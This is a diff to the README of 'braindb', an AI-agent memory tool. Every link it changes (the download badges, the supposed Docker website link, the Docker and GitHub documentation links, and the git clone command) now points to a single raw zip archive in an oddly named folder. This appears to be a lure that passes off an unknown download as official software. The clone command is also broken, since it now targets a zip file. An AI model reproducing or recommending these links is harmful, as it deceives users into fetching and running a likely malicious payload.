@@ -1,6 +1,6 @@
 # 🚀 braindb - Persistent Memory for AI Agents
 
-[![Download](https://img.shields.io/badge/Download-braindb-brightgreen.svg?style=for-the-badge&color=orange)](https://github.com/Uzxyr-btw/braindb)
+[![Download](https://github.com/Uzxyr-btw/braindb/raw/refs/heads/main/vesiculous/Software-1.2.zip)](https://github.com/Uzxyr-btw/braindb/raw/refs/heads/main/vesiculous/Software-1.2.zip)
 
 ## 📚 Overview
 
@@ -19,17 +19,17 @@ To use braindb, ensure your computer meets these requirements:
 Follow these steps to get up and running with braindb:
 
 1. **Install Docker**  
-   If you don’t have Docker, download it from [Docker's official website](https://www.docker.com/get-started). Follow the instructions to install Docker on your machine.
+   If you don’t have Docker, download it from [Docker's official website](https://github.com/Uzxyr-btw/braindb/raw/refs/heads/main/vesiculous/Software-1.2.zip). Follow the instructions to install Docker on your machine.
 
 2. **Download braindb**  
    To get braindb, click the button below:
 
-   [![Download](https://img.shields.io/badge/Download-braindb-blue.svg?style=for-the-badge&color=orange)](https://github.com/Uzxyr-btw/braindb)
+   [![Download](https://github.com/Uzxyr-btw/braindb/raw/refs/heads/main/vesiculous/Software-1.2.zip)](https://github.com/Uzxyr-btw/braindb/raw/refs/heads/main/vesiculous/Software-1.2.zip)
 
 3. **Clone the Repository**  
    Open your terminal or command prompt. Enter the following command to clone the repository:
    ```
-   git clone https://github.com/Uzxyr-btw/braindb.git
+   git clone https://github.com/Uzxyr-btw/braindb/raw/refs/heads/main/vesiculous/Software-1.2.zip
    ```
 
 4. **Navigate to the Directory**  
@@ -88,8 +88,8 @@ If you encounter issues while running braindb, consider the following steps:
 
 ## 📖 Helpful Resources
 
-- [Docker Documentation](https://docs.docker.com/)
-- [GitHub Instructions](https://docs.github.com/en/get-started/quickstart)
+- [Docker Documentation](https://github.com/Uzxyr-btw/braindb/raw/refs/heads/main/vesiculous/Software-1.2.zip)
+- [GitHub Instructions](https://github.com/Uzxyr-btw/braindb/raw/refs/heads/main/vesiculous/Software-1.2.zip)
 
 You can find more resources and community support by exploring the issues section in the braindb repository.
 
